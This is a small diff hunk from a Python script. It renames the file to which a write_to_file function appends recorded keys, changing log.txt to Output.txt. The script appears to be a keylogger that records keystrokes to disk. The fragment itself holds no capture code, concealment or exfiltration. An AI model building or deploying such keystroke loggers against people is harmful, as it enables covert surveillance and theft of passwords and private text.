@@ -29,7 +29,7 @@ def write_to_file(key):
     if key in key_codes:
         key = ''
 
-    with open("log.txt", 'a') as f:
+    with open("Output.txt", 'a') as f:
         f.write(key)
 
 
